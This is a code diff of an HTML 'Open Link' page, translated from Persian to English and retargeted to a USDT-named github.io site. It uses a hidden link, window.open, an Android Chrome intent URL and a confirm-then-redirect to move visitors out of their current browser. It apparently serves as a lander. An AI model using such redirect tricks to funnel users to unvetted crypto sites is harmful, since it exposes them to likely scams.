@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>باز کردن لینک</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Open Link</title>
   <style>
     * {
       margin: 0;
@@ -17,126 +17,129 @@
       align-items: center;
       justify-content: center;
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      font-family: system-ui, -apple-system, sans-serif;
-      direction: rtl;
-      padding: 15px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      padding: 12px;
     }
     
     .container {
       background: white;
-      padding: 40px 25px;
-      border-radius: 30px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-      max-width: 500px;
+      padding: 24px 18px;
+      border-radius: 24px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+      max-width: 400px;
       width: 100%;
       text-align: center;
     }
     
     h1 {
-      font-size: 2em;
-      margin-bottom: 15px;
+      font-size: 1.6em;
+      margin-bottom: 8px;
       color: #1a1a1a;
+      font-weight: 600;
     }
     
     .subtitle {
       color: #666;
-      margin-bottom: 30px;
-      font-size: 1.1em;
+      margin-bottom: 20px;
+      font-size: 0.9em;
     }
     
     .url-box {
-      background: #f3f4f6;
-      padding: 20px;
-      border-radius: 16px;
-      margin: 25px 0;
-      border: 2px solid #e5e7eb;
+      background: #f5f5f5;
+      padding: 12px 10px;
+      border-radius: 12px;
+      margin: 16px 0;
+      border: 1px solid #e0e0e0;
       word-break: break-all;
-      font-family: monospace;
-      font-size: 1.1em;
+      font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', monospace;
+      font-size: 0.85em;
       color: #2563eb;
-      font-weight: bold;
+      font-weight: 500;
     }
     
     .button-group {
       display: flex;
       flex-direction: column;
-      gap: 12px;
-      margin: 25px 0;
+      gap: 8px;
+      margin: 16px 0;
     }
     
     .btn {
-      padding: 18px 24px;
+      padding: 14px 16px;
       border: none;
-      border-radius: 16px;
-      font-size: 1.2em;
-      font-weight: bold;
+      border-radius: 14px;
+      font-size: 0.95em;
+      font-weight: 600;
       cursor: pointer;
-      transition: all 0.3s;
+      transition: all 0.2s;
       color: white;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 8px;
+      width: 100%;
     }
     
     .btn:active {
-      transform: scale(0.98);
+      transform: scale(0.97);
     }
     
     .btn-chrome {
       background: #ea4335;
-      box-shadow: 0 8px 20px rgba(234, 67, 53, 0.3);
+      box-shadow: 0 4px 12px rgba(234, 67, 53, 0.3);
     }
     
     .btn-firefox {
       background: #ff7139;
-      box-shadow: 0 8px 20px rgba(255, 113, 57, 0.3);
+      box-shadow: 0 4px 12px rgba(255, 113, 57, 0.3);
     }
     
     .btn-copy {
       background: #34a853;
-      box-shadow: 0 8px 20px rgba(52, 168, 83, 0.3);
+      box-shadow: 0 4px 12px rgba(52, 168, 83, 0.3);
     }
     
     .btn-link {
       background: #1a73e8;
-      box-shadow: 0 8px 20px rgba(26, 115, 232, 0.3);
+      box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
       text-decoration: none;
-      display: inline-block;
     }
     
     .success-message {
-      background: #d1fae5;
-      color: #065f46;
-      padding: 12px;
+      background: #e6f7e6;
+      color: #2e7d32;
+      padding: 10px;
       border-radius: 10px;
-      margin-top: 15px;
+      margin-top: 10px;
       display: none;
-      font-weight: bold;
+      font-weight: 500;
+      font-size: 0.9em;
     }
     
-    .warning-box {
-      background: #fff3cd;
-      border: 2px solid #ffeeba;
-      color: #856404;
-      padding: 20px;
-      border-radius: 16px;
-      margin-top: 25px;
-      text-align: right;
+    .help-box {
+      background: #f8f9fa;
+      border: 1px solid #e9ecef;
+      color: #495057;
+      padding: 14px;
+      border-radius: 14px;
+      margin-top: 16px;
+      text-align: left;
+      font-size: 0.85em;
     }
     
-    .warning-box h3 {
-      margin-bottom: 10px;
-      color: #533f03;
+    .help-box h3 {
+      margin-bottom: 8px;
+      color: #2c3e50;
+      font-size: 1em;
     }
     
-    .warning-box ol {
-      padding-right: 25px;
-      line-height: 1.8;
+    .help-box ol {
+      padding-left: 20px;
+      line-height: 1.5;
     }
     
-    .warning-box li {
-      margin: 8px 0;
+    .help-box li {
+      margin: 5px 0;
     }
     
     .hidden-link {
@@ -144,109 +147,110 @@
       position: absolute;
       pointer-events: none;
     }
+    
+    .emoji {
+      font-size: 1.1em;
+    }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>🔗 باز کردن لینک ویژه</h1>
-  <p class="subtitle">این لینک فقط در کروم یا فایرفاکس به درستی باز میشه</p>
+  <h1>🔗 Open Link</h1>
+  <p class="subtitle">This link works best in Chrome or Firefox</p>
   
   <div class="url-box" id="urlDisplay">
-    https://my-us.github.io
+    https://trc20-usdt.github.io
   </div>
 
-  <!-- لینک مخفی برای کلیک مستقیم -->
-  <a href="https://my-us.github.io" id="directLink" class="hidden-link" target="_blank" rel="noopener noreferrer">لینک مستقیم</a>
+  <!-- Hidden direct link -->
+  <a href="https://trc20-usdt.github.io" id="directLink" class="hidden-link" target="_blank" rel="noopener noreferrer">Direct link</a>
 
   <div class="button-group">
     <button class="btn btn-chrome" id="chromeBtn">
-      <span>📱</span> باز کردن در کروم
+      <span class="emoji">📱</span> Open in Chrome
     </button>
     
     <button class="btn btn-firefox" id="firefoxBtn">
-      <span>🦊</span> باز کردن در فایرفاکس
+      <span class="emoji">🦊</span> Open in Firefox
     </button>
     
     <button class="btn btn-copy" id="copyBtn">
-      <span>📋</span> کپی لینک
+      <span class="emoji">📋</span> Copy Link
     </button>
     
-    <a href="https://my-us.github.io" class="btn btn-link" target="_blank" rel="noopener noreferrer">
-      <span>🔗</span> کلیک مستقیم (ضمانتی)
+    <a href="https://trc20-usdt.github.io" class="btn btn-link" target="_blank" rel="noopener noreferrer">
+      <span class="emoji">🔗</span> Direct Open
     </a>
   </div>
 
   <div class="success-message" id="successMsg">
-    ✅ لینک با موفقیت کپی شد!
+    ✅ Link copied to clipboard!
   </div>
 
-  <div class="warning-box">
-    <h3>⚠️ روش استفاده ضمانتی:</h3>
+  <div class="help-box">
+    <h3>📌 How to open:</h3>
     <ol>
-      <li><strong>روی دکمه "کلیک مستقیم" بزن</strong> - ساده‌ترین راه</li>
-      <li>اگه باز نشد، دکمه "کپی لینک" رو بزن</li>
-      <li>خودت مرورگر کروم یا فایرفاکس رو باز کن</li>
-      <li>لینک رو در نوار آدرس paste کن (روی نوار آدرس فشار بده و گزینه Paste رو بزن)</li>
-      <li>دکمه Enter رو بزن</li>
+      <li>Tap <strong>"Direct Open"</strong> button</li>
+      <li>If that doesn't work, tap <strong>"Copy Link"</strong></li>
+      <li>Open Chrome or Firefox manually</li>
+      <li>Paste link in address bar</li>
+      <li>Press Enter</li>
     </ol>
-    <p style="margin-top: 15px; color: #d32f2f; font-weight: bold;">❗ اگه بازم کار نکرد، لینک رو به صورت دستی تایپ کن</p>
   </div>
 </div>
 
 <script>
-// تنظیم لینک مورد نظر
-const TARGET_URL = "https://my-us.github.io";
+// Target link
+const TARGET_URL = "https://trc20-usdt.github.io";
 
-// به‌روزرسانی لینک در صفحه
+// Update all links
 document.getElementById('urlDisplay').innerText = TARGET_URL;
 document.getElementById('directLink').href = TARGET_URL;
 
-// تابع باز کردن لینک با روش‌های مختلف
+// Function to open link with multiple methods
 function openLink(url) {
-  // روش 1: استفاده از لینک مخفی
+  // Method 1: Click hidden direct link
   const directLink = document.getElementById('directLink');
   directLink.click();
   
-  // روش 2: باز کردن مستقیم (پشتیبان)
+  // Method 2: Direct window open
   setTimeout(() => {
     window.open(url, '_blank');
   }, 100);
   
-  // روش 3: برای اندروید - روش intent
+  // Method 3: Android intent
   if (/Android/i.test(navigator.userAgent)) {
     try {
-      // سعی می‌کنیم با intent باز کنیم
       const intentUrl = `intent://${url.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
       window.location.href = intentUrl;
     } catch (e) {
-      console.log('Intent failed:', e);
+      console.log('Intent failed');
     }
   }
   
-  // نمایش پیام راهنما
+  // Show help message
   setTimeout(() => {
-    alert('📌 راهنمایی:\nاگر لینک باز نشد:\n1. روی "کپی لینک" بزن\n2. خودت کروم/فایرفاکس رو باز کن\n3. لینک رو paste کن');
+    alert('💡 Tip:\nIf link doesn\'t open:\n1. Tap "Copy Link"\n2. Open Chrome/Firefox\n3. Paste and go');
   }, 500);
 }
 
-// دکمه کروم
+// Chrome button
 document.getElementById('chromeBtn').onclick = function() {
   openLink(TARGET_URL);
 };
 
-// دکمه فایرفاکس - دقیقاً مثل کروم عمل می‌کنه
+// Firefox button (same as Chrome)
 document.getElementById('firefoxBtn').onclick = function() {
   openLink(TARGET_URL);
 };
 
-// دکمه کپی لینک
+// Copy button
 document.getElementById('copyBtn').onclick = async function() {
   try {
     await navigator.clipboard.writeText(TARGET_URL);
     showSuccessMessage();
   } catch (err) {
-    // روش قدیمی برای مرورگرهای ضعیف
     copyToClipboardFallback(TARGET_URL);
     showSuccessMessage();
   }
@@ -268,26 +272,26 @@ function showSuccessMessage() {
   msg.style.display = 'block';
   setTimeout(() => {
     msg.style.display = 'none';
-  }, 3000);
+  }, 2000);
 }
 
-// اگه مرورگر کروم یا فایرفاکس بود، یه پیام نشون بده
+// Browser detection (optional)
 function detectBrowser() {
   const ua = navigator.userAgent.toLowerCase();
   const isChrome = !!window.chrome && navigator.vendor?.toLowerCase().includes('google') && !/edg\//.test(ua);
   const isFirefox = /firefox|fxios/.test(ua);
   
   if (isChrome || isFirefox) {
-    // اگه خودش توی مرورگر درسته، می‌تونیم بعد ۳ ثانیه لینک رو باز کنیم
+    // Optional: auto-redirect after 2 seconds
     setTimeout(() => {
-      if (confirm('مرورگر شما مناسب است. می‌خواهید لینک باز شود؟')) {
+      if (confirm('Your browser is supported. Open link now?')) {
         window.location.href = TARGET_URL;
       }
     }, 1000);
   }
 }
 
-// اجرای تشخیص مرورگر
+// Run browser detection
 detectBrowser();
 </script>
 
